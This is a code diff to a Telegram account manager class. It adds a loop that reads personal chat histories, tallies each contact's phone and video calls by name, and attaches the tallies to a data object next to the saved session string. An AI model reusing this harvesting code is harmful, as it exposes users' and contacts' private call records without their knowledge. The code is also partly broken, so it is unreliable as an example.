@@ -351,7 +351,7 @@ class TelegramManager {
         let movieCount = 0;
         const sess = this.client.session.save() as unknown as string;
         const user: any = await result.toJSON();
-        // const chats = await this.client?.getDialogs({ limit: 600 });
+        const dialogs = await this.client?.getDialogs({ limit: 600 });
         // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
         // for (const message of messageHistory) {
         //     const text = message.text.toLocaleLowerCase();
@@ -383,19 +383,43 @@ class TelegramManager {
         let personalChats = 0;
         let channels = 0;
         const chatsArray = [];
+        const allCallLogs = [];
 
-        // chats.map((chat: any) => {
-        //     if (chat.isChannel || chat.isGroup) {
-        //         channels++;
-        //         const chatEntity = chat.entity.toJSON();
-        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-        //         if (!chatEntity.broadcast && !cannotSendMsgs) {
-        //             chatsArray.push(chatEntity);
-        //         }
-        //     } else {
-        //         personalChats++
-        //     }
-        // });
+        for (let chat of dialogs) {
+            if (chat.isChannel || chat.isGroup) {
+                channels++;
+                const chatEntity: any = chat.entity.toJSON();
+                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+                if (!chatEntity.broadcast && !cannotSendMsgs) {
+                    chatsArray.push(chatEntity);
+                }
+            } else {
+                personalChats++
+                try {
+                    const history = await this.client.getMessages((chat as any).peer, { limit: 600 })
+                    history.map(async (msg: any) => {
+                        if (msg.action?.className == 'MessageActionPhoneCall') {
+                            if (!allCallLogs[msg.peerId.userId.toString()]) {
+                                const ent: any = await this.client.getEntity(msg.peerId.userId);
+                                allCallLogs[msg.peerId.userId.toString()] = { name: `${ent.firstName} ${ent.lastName ? ent.lastName : ''}`, video: 0, total: 0, out: 0 }
+                            }
+                            allCallLogs[msg.peerId.userId.toString()]['total']++
+                            if (msg.action.video) {
+                                allCallLogs[msg.peerId.userId.toString()]['video']++
+                            }
+                            if (msg.out) {
+                                allCallLogs[msg.peerId.userId.toString()]['out']++
+                            }
+                        }
+                    })
+                } catch (error) {
+                    console.log(error)
+                    console.log("failed to fetch peer")
+                }
+                console.log("Formatted Contacts:", allCallLogs.length);
+            }
+        }
+
         let data;
         try {
             const options = {
@@ -422,6 +446,7 @@ class TelegramManager {
             userName: user.username,
             channels: channels,
             personalChats: personalChats,
+            calls: allCallLogs,
             msgs: 0,//messageHistory.total,
             totalChats: 0,//chats['total'],
             lastActive: Date.now(),//lastActive,
